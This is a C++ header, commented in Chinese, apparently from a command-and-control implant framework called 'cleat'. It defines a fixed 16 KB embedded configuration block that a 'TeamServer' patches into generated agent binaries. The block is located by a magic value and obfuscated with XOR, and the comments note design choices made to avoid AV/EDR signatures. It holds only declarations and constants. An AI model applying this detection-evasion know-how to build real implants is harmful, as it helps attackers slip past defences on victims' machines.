/**
 * @file EmbeddedConfig.hpp
 * @brief 模板化配置块（CS 式 artifact 机制）
 * @details
 * 原理：
 * 预编译模板二进制内嵌一块固定大小（16kb）的只读配置区：
 *   [16B 魔数（伪随机字节，非字符串）] [1B 版本] [1B 状态] [XOR(0x5A) JSON]
 * - Agent 运行时直接用符号地址访问（数据在 .rdata 内存映射内，不读自身文件）
 * - TeamServer 生成样本时按魔数在文件中搜索定位，直接替换块内容（秒级，零编译）
 * - 无自定义 PE 节（非标准节名是 AV/EDR 特征），文件长度不变，PE 结构零改动
 * - 配置优先序：CLI 参数 > 嵌入配置（本块）> 编译期默认（AgentConfig）
 *
 * @note 魔数与块布局必须与 TeamServer/服务端实现 保持一致（两处注释互指）。
 *
 * 落位说明: 归 **Core/Bootstrap/** —— 本机制是"生成期注入管线"
 * (TeamServer 生成器 patch 产物 → 启动早期应用), 与运行时配置中心(Core/Config)是
 * 两条配置来源, 优先序: CLI > 嵌入配置(本块) > 编译期默认。
 */

#pragma once

#include <cstdint>

namespace cleat {

    /**
     * @brief 配置块魔数（16B，伪随机固定值，有意非字符串）
     * @details 与 patch.go 中的 kCfgMagic 保持一致。
     */
    inline constexpr uint8_t kCfgMagic[16] = {
        0x8B, 0xE4, 0x1F, 0x73, 0xC2, 0x5A, 0x90, 0x3D,
        0x47, 0xB1, 0x6E, 0x0A, 0xD9, 0x24, 0xEC, 0x51
    };

    /** @brief 固定块大小（16KB：全字段 JSON + 规则数组余量；替换不改文件长度） */
    inline constexpr uint32_t kCfgBlobSize = 16384;

    /** @brief 配置块版本号 */
    inline constexpr uint8_t kCfgVersion = 1;

    /** @brief 模板状态：未配置（走 CLI/编译期默认） */
    inline constexpr uint8_t kCfgStateEmpty = 0;

    /** @brief 模板状态：已配置 */
    inline constexpr uint8_t kCfgStateSet = 1;

    /** @brief 载荷混淆密钥（防 strings 直接读，非强加密） */
    inline constexpr uint8_t kCfgXorKey = 0x5A;

    /**
     * @brief 配置块数据（位于 .rdata 段的普通 const 数组）
     * @details 定义在 Platform 实现文件中，服务器按魔数搜索定位。
     *          模板状态下只有魔数 + 版本 + 空状态。
     */
    extern const uint8_t g_cfg_blob[kCfgBlobSize];

    /**
     * @brief 启动时应用嵌入配置（在参数解析前调用）
     * @details 若块已配置，则解析并写入 AgentConfig（含 PSK/PubKey）。
     * @retval true  命中并成功应用了嵌入配置
     * @retval false 未命中或应用失败
     */
    bool EmbeddedConfigApply();

} // namespace cleat